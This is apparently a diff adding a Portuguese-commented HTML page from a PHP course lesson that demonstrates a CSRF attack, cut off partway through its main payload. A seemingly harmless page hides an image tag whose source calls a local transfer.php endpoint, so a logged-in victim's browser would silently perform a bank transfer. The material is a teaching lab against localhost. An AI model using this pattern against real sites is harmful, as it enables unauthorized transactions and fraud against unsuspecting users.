@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- Define o conjunto de caracteres -->
+    <meta charset="UTF-8">
+
+    <!-- Ajusta a visualização para dispositivos móveis -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Título da página -->
+    <title>CSRF Atasque</title>
+</head>
+<body>
+    <!-- Conteúdo aparentemente inofensivo -->
+    <h1>Página Inofensiva</h1>
+    <p>Esta página parece inofensiva, mas na verdade está realizando um ataque CSRF.</p>
+
+    <!-- 
+        ESTE É O ATAQUE CSRF:
+        A imagem não aparece na tela (display: none),
+        mas o navegador ainda faz a requisição para o src.
+        
+        Se o usuário estiver logado no site do banco,
+        a sessão será enviada automaticamente,
+        executando a transferência sem o usuário perceber.
+    -->
+    <img src="http://localhost/dimmy/Estudo/b7web/php/introducao/aula/Modulo03/aula16-CSRF/transferir.php?con
